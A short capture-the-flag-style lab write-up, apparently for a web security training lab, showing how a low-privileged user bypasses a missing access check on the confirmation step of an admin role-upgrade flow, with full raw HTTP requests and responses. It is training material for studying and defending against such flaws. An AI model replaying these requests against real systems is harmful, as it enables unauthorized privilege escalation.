# Lab: Multi-step process with no access control on one step

- After logging as administrator, we can see he can upgrade other users to privileged state.
- However, it is a 2 step process.
	- First, a `POST` request to `/admin-roles` is sent with parameters `username=carlos` and `action=upgrade`
	- Second, the server confirms the request by making the administrator send another `POST` request to `/admin-roles` with parameters `action=upgrade`, `confirmed=true` and `username=carlos`.
- The access control in first step seems to be correctly configured if we make request through `wiener`.

```
POST /admin-roles HTTP/1.1
Host: acdf1f0e1ef252f3c040299900f40032.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: session=z3Wcq7Qltk1cs8maUJd5ZqVIHz77nVvO
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

username=carlos&action=upgrade
```

```
HTTP/1.1 401 Unauthorized
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 14

"Unauthorized"
```

- However, the access control in second step is not correctly configured.

```
POST /admin-roles HTTP/1.1
Host: acdf1f0e1ef252f3c040299900f40032.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: session=z3Wcq7Qltk1cs8maUJd5ZqVIHz77nVvO
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

action=upgrade&confirmed=true&username=wiener
```

```
HTTP/1.1 302 Found
Location: /admin
Connection: close
Content-Length: 0
```

- If we directly make a request to `/admin-roles` with the 2nd stage parameters, we get a `302` response which is definitely a good thing.
